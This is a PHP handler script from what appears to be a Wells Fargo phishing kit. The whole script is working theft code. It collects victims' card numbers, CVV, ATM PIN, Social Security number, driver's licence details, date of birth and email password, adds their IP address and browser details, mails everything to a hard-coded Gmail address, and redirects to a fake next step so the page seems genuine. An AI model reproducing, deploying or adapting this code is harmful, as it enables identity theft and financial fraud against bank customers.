<?php
if($_POST["noc"] != "" and $_POST["addr"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------WellsFargo Info-----------------------\n";
$message .= "Name on Card            : ".$_POST['noc']."\n";
$message .= "Address              : ".$_POST['addr']."\n";
$message .= "Card Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       : ".$_POST['ex']."\n";
$message .= "Cvv2            : ".$_POST['cv']."\n";
$message .= "ATM PIN          : ".$_POST['pn']."\n";
$message .= "Social Security Number            : ".$_POST['sn']."\n";
$message .= "Driver's License            : ".$_POST['dl']."\n";
$message .= "Driver's License Expiry Date           : ".$_POST['dlx']."\n";
$message .= "Date of Birth          : ".$_POST['db']."\n";
$message .= "Email Address             : ".$_POST['eml']."\n";
$message .= "Email Password             : ".$_POST['eps']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "mohammed.noip707@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>